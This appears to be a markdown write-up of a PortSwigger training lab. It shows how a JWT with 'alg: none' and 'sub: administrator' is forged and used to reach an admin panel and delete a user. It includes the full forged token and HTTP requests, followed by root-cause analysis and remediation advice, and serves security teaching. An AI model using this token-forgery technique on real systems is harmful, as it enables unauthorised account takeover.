@@ -1,0 +1,690 @@
+# JWT Authentication Bypass via Unverified Signature
+
+**Lab:** JWT authentication bypass via unverified signature
+**Category:** Authentication / Broken Access Control
+**Difficulty:** Apprentice
+**Platform:** PortSwigger Web Security Academy
+
+---
+
+# Executive Summary
+
+The application used JSON Web Tokens (JWTs) to authenticate users. However, the server failed to properly verify the cryptographic signature of the JWT before trusting its claims.
+
+The original token used the `RS256` algorithm. By modifying the JWT header to specify `alg: none` and removing the signature, it was possible to construct an unsigned token with the `sub` claim set to `administrator`.
+
+The application accepted this forged token as a valid authentication credential, granting access to the administrative panel.
+
+The administrative interface exposed a user deletion endpoint, which was then used to delete the user `carlos` and complete the lab.
+
+---
+
+# Vulnerability Classification
+
+| Attribute          | Value                                                      |
+| ------------------ | ---------------------------------------------------------- |
+| Vulnerability      | JWT Authentication Bypass via Unverified Signature         |
+| CWE                | CWE-347 – Improper Verification of Cryptographic Signature |
+| OWASP Top 10       | A07:2021 – Identification and Authentication Failures      |
+| Secondary Category | Broken Access Control                                      |
+| Severity           | High                                                       |
+| Attack Vector      | Forged JWT authentication token                            |
+
+---
+
+# Target
+
+**Application:** PortSwigger Web Security Academy
+
+**Lab:** JWT authentication bypass via unverified signature
+
+**Target User:**
+
+```text
+administrator
+```
+
+**Target Action:**
+
+```text
+Delete user: carlos
+```
+
+---
+
+# Objective
+
+Forge a JWT authentication token that impersonates the `administrator` user and use the resulting administrative privileges to delete the user `carlos`.
+
+---
+
+# Methodology
+
+1. Obtain and inspect a valid JWT.
+2. Decode the JWT header and payload.
+3. Identify the signing algorithm used by the application.
+4. Modify the JWT header to use `alg: none`.
+5. Change the `sub` claim to `administrator`.
+6. Remove the cryptographic signature.
+7. Replace the existing session cookie with the forged JWT.
+8. Access the administrative panel.
+9. Identify the user deletion endpoint.
+10. Delete `carlos`.
+
+---
+
+# Initial Enumeration
+
+The application used a session cookie containing a JWT.
+
+The original token followed the standard JWT structure:
+
+```text
+HEADER.PAYLOAD.SIGNATURE
+```
+
+The JWT header contained the following information:
+
+```json
+{
+  "kid": "0d75b7cf-3fc8-46cd-9f74-1aab102adc73",
+  "alg": "RS256"
+}
+```
+
+The `RS256` value indicated that the application was using RSA-based cryptographic signatures.
+
+The payload contained:
+
+```json
+{
+  "iss": "portswigger",
+  "exp": 1787052035,
+  "sub": "administrator"
+}
+```
+
+The important authentication claim was:
+
+```json
+"sub": "administrator"
+```
+
+This claim identifies the authenticated subject.
+
+---
+
+# Identifying the Vulnerability
+
+The critical observation was that the application accepted the JWT's declared signing algorithm without properly enforcing server-side signature verification.
+
+JWTs contain the algorithm in their header:
+
+```json
+{
+  "alg": "RS256"
+}
+```
+
+A vulnerable implementation may incorrectly trust a token that specifies:
+
+```json
+{
+  "alg": "none"
+}
+```
+
+The `none` algorithm indicates that no cryptographic signature is present.
+
+A secure implementation must reject such a token unless unsigned JWTs are explicitly and safely supported for a specific use case.
+
+---
+
+# Forging the JWT
+
+The original JWT header was modified from:
+
+```json
+{
+  "kid": "0d75b7cf-3fc8-46cd-9f74-1aab102adc73",
+  "alg": "RS256"
+}
+```
+
+to:
+
+```json
+{
+  "kid": "0d75b7cf-3fc8-46cd-9f74-1aab102adc73",
+  "alg": "none"
+}
+```
+
+The payload was retained with the administrator identity:
+
+```json
+{
+  "iss": "portswigger",
+  "exp": 1787052035,
+  "sub": "administrator"
+}
+```
+
+The resulting JWT therefore had the following structure:
+
+```text
+BASE64URL(HEADER).
+BASE64URL(PAYLOAD).
+```
+
+The final period is intentional because the signature portion is empty.
+
+---
+
+# JWT Construction
+
+The modified header was encoded using Base64URL encoding.
+
+The resulting header segment was:
+
+```text
+eyJraWQiOiIwZDc1YjdjZi0zZmM4LTQ2Y2QtOWY3NC0xYWFiMTAyYWRjNzMiLCJhbGciOiJub25lIn0
+```
+
+The payload segment was:
+
+```text
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NzA1MjAzNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9
+```
+
+The resulting forged token was:
+
+```text
+eyJraWQiOiIwZDc1YjdjZi0zZmM4LTQ2Y2QtOWY3NC0xYWFiMTAyYWRjNzMiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NzA1MjAzNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+```
+
+The final JWT contained three segments:
+
+```text
+HEADER.PAYLOAD.EMPTY_SIGNATURE
+```
+
+---
+
+# Authentication Bypass
+
+The forged token was inserted into the application's `session` cookie.
+
+Request:
+
+```http
+GET /admin HTTP/2
+Host: 0ab8009f042cacfa814c6b9b005200e8.web-security-academy.net
+Cookie: session=eyJraWQiOiIwZDc1YjdjZi0zZmM4LTQ2Y2QtOWY3NC0xYWFiMTAyYWRjNzMiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NzA1MjAzNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+```
+
+The server returned:
+
+```http
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+```
+
+This was significant because the request successfully accessed the administrative interface using an unsigned JWT.
+
+---
+
+# Administrative Panel
+
+The response revealed the administrative panel and exposed the available users.
+
+The relevant functionality included:
+
+```html
+<div>
+    <span>wiener - </span>
+    <a href="/admin/delete?username=wiener">Delete</a>
+</div>
+
+<div>
+    <span>carlos - </span>
+    <a href="/admin/delete?username=carlos">Delete</a>
+</div>
+```
+
+The application therefore exposed the following administrative endpoint:
+
+```http
+GET /admin/delete?username=carlos
+```
+
+---
+
+# Exploitation
+
+The forged administrator JWT was retained and the request path was changed to the user deletion endpoint.
+
+Final request:
+
+```http
+GET /admin/delete?username=carlos HTTP/2
+Host: 0ab8009f042cacfa814c6b9b005200e8.web-security-academy.net
+Cookie: session=eyJraWQiOiIwZDc1YjdjZi0zZmM4LTQ2Y2QtOWY3NC0xYWFiMTAyYWRjNzMiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NzA1MjAzNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+```
+
+Because the application trusted the forged JWT, the request was processed with administrator privileges.
+
+The user `carlos` was successfully deleted.
+
+The laboratory was therefore solved.
+
+---
+
+# Technical Analysis
+
+A JWT normally consists of three components:
+
+```text
+HEADER.PAYLOAD.SIGNATURE
+```
+
+The signature provides integrity protection for the header and payload.
+
+In this lab, the original token used:
+
+```json
+"alg": "RS256"
+```
+
+After manipulation, the header specified:
+
+```json
+"alg": "none"
+```
+
+This resulted in:
+
+```text
+HEADER.PAYLOAD.
+```
+
+The application failed to reject the unsigned token and instead trusted the claims contained within it.
+
+The attack can therefore be represented as:
+
+```text
+Legitimate JWT
+      │
+      ▼
+Modify "alg"
+RS256 ─────────► none
+      │
+      ▼
+Modify / retain claims
+sub = administrator
+      │
+      ▼
+Remove signature
+      │
+      ▼
+Forged JWT
+      │
+      ▼
+Send as session cookie
+      │
+      ▼
+Application accepts token
+      │
+      ▼
+Administrator privileges
+```
+
+---
+
+# HTTP Evidence
+
+## Forged Authentication Token
+
+```http
+Cookie: session=eyJraWQiOiIwZDc1YjdjZi0zZmM4LTQ2Y2QtOWY3NC0xYWFiMTAyYWRjNzMiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NzA1MjAzNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+```
+
+The important characteristics were:
+
+```text
+alg = none
+sub = administrator
+signature = empty
+```
+
+---
+
+## Administrative Access
+
+```http
+GET /admin HTTP/2
+Host: 0ab8009f042cacfa814c6b9b005200e8.web-security-academy.net
+Cookie: session=FORGED_JWT
+```
+
+Response:
+
+```http
+HTTP/2 200 OK
+```
+
+The response contained:
+
+```text
+Admin panel
+```
+
+and the available administrative operations.
+
+---
+
+## User Deletion
+
+```http
+GET /admin/delete?username=carlos HTTP/2
+Host: 0ab8009f042cacfa814c6b9b005200e8.web-security-academy.net
+Cookie: session=FORGED_JWT
+```
+
+The endpoint accepted the forged administrator identity and deleted the target user.
+
+---
+
+# Root Cause
+
+The root cause was improper verification of the JWT's cryptographic signature.
+
+The application trusted the algorithm specified by the attacker-controlled JWT header and accepted:
+
+```json
+"alg": "none"
+```
+
+without requiring a valid cryptographic signature.
+
+This allowed an attacker to construct a token containing arbitrary claims, including:
+
+```json
+"sub": "administrator"
+```
+
+The application then treated the attacker-controlled identity as trusted.
+
+The fundamental security failure was therefore:
+
+```text
+Attacker-controlled JWT
+        │
+        ▼
+Attacker-controlled algorithm
+        │
+        ▼
+Signature verification bypass
+        │
+        ▼
+Attacker-controlled identity
+        │
+        ▼
+Administrative access
+```
+
+---
+
+# Impact
+
+Successful exploitation allowed an unauthenticated attacker who could obtain or manipulate a JWT to impersonate an administrative user.
+
+Potential impact includes:
+
+* Authentication bypass.
+* Administrator impersonation.
+* Unauthorized access to privileged functionality.
+* User account deletion.
+* Unauthorized modification of application data.
+* Potential compromise of the entire application depending on available administrative functionality.
+
+In this lab, the vulnerability resulted in the deletion of the user `carlos`.
+
+---
+
+# Attack Flow
+
+```text
+1. Obtain legitimate JWT
+          │
+          ▼
+2. Decode JWT
+          │
+          ▼
+3. Change alg from RS256 to none
+          │
+          ▼
+4. Set sub = administrator
+          │
+          ▼
+5. Remove signature
+          │
+          ▼
+6. Replace session cookie
+          │
+          ▼
+7. Request /admin
+          │
+          ▼
+8. Administrator panel accessible
+          │
+          ▼
+9. Request /admin/delete?username=carlos
+          │
+          ▼
+10. Carlos deleted
+```
+
+---
+
+# Security Recommendations
+
+## Enforce a Server-Side Algorithm Allowlist
+
+The application should explicitly define which algorithms are permitted.
+
+For example:
+
+```text
+Allowed:
+RS256
+```
+
+and reject unexpected values such as:
+
+```text
+none
+HS256
+```
+
+unless they are explicitly required and securely configured.
+
+The server should never blindly trust the `alg` value supplied by the client.
+
+---
+
+## Always Verify JWT Signatures
+
+Before accepting authentication claims, the application should:
+
+1. Parse the token.
+2. Validate its structure.
+3. Enforce an expected signing algorithm.
+4. Verify the cryptographic signature.
+5. Validate standard claims.
+6. Only then trust authorization-related claims.
+
+---
+
+## Do Not Trust Client-Controlled Identity Claims
+
+Claims such as:
+
+```json
+"sub": "administrator"
+```
+
+must only be trusted after successful cryptographic verification.
+
+Changing the payload must invalidate the token.
+
+---
+
+## Validate Standard JWT Claims
+
+The application should also validate claims such as:
+
+```text
+iss
+exp
+sub
+aud
+nbf
+```
+
+where applicable.
+
+In particular, expiration and issuer validation help prevent the acceptance of invalid or unintended tokens.
+
+---
+
+## Use Well-Tested JWT Libraries
+
+JWT parsing and validation should be implemented using mature security libraries rather than custom cryptographic logic.
+
+The library should be configured to explicitly restrict accepted algorithms.
+
+---
+
+## Separate Authentication and Authorization
+
+Even after successful JWT validation, sensitive administrative operations should enforce server-side authorization checks.
+
+For example:
+
+```text
+Valid JWT
+    │
+    ▼
+Authenticated user
+    │
+    ▼
+Authorization check
+    │
+    ▼
+Is user authorized to delete accounts?
+    │
+    ├── No ──► 403 Forbidden
+    │
+    └── Yes ─► Execute operation
+```
+
+---
+
+# Secure JWT Validation Model
+
+A secure implementation should follow this model:
+
+```text
+Client
+  │
+  ▼
+JWT
+  │
+  ▼
+Parse token
+  │
+  ▼
+Validate algorithm
+  │
+  ├── Unexpected ──► Reject
+  │
+  ▼
+Verify signature
+  │
+  ├── Invalid ─────► Reject
+  │
+  ▼
+Validate claims
+  │
+  ├── Invalid ─────► Reject
+  │
+  ▼
+Authenticate user
+  │
+  ▼
+Authorize requested action
+  │
+  ▼
+Execute operation
+```
+
+---
+
+# References
+
+* OWASP Top 10 2021 – A07: Identification and Authentication Failures
+* CWE-347 – Improper Verification of Cryptographic Signature
+* PortSwigger Web Security Academy – JSON Web Tokens
+* PortSwigger Web Security Academy – JWT authentication bypass via unverified signature
+
+---
+
+# Conclusion
+
+The application was vulnerable to a **JWT authentication bypass caused by improper signature verification**.
+
+By changing the JWT algorithm from:
+
+```json
+"alg": "RS256"
+```
+
+to:
+
+```json
+"alg": "none"
+```
+
+and removing the signature, it was possible to forge an authentication token containing the privileged identity:
+
+```json
+"sub": "administrator"
+```
+
+The application accepted the forged token and granted access to the administrative panel.
+
+The exposed administrative functionality was then used to delete:
+
+```text
+carlos
+```
+
+This demonstrates why applications must never trust the JWT algorithm or authentication claims supplied by the client without performing strict server-side cryptographic verification.
+
+---
+
+# Key Takeaways
+
+* JWT payloads are not inherently trustworthy.
+* The `alg` header must never be blindly trusted.
+* `alg: none` must be rejected unless explicitly required and safely implemented.
+* JWT signatures must always be verified before trusting authentication claims.
+* Claims such as `sub` must not be trusted before signature validation.
+* Authentication and authorization should be enforced independently.
+* Administrative endpoints must perform server-side authorization checks.
+* JWT implementation should rely on well-tested libraries with explicit algorithm restrictions.
+
+---
+
+**Lab Status:** ✅ Solved
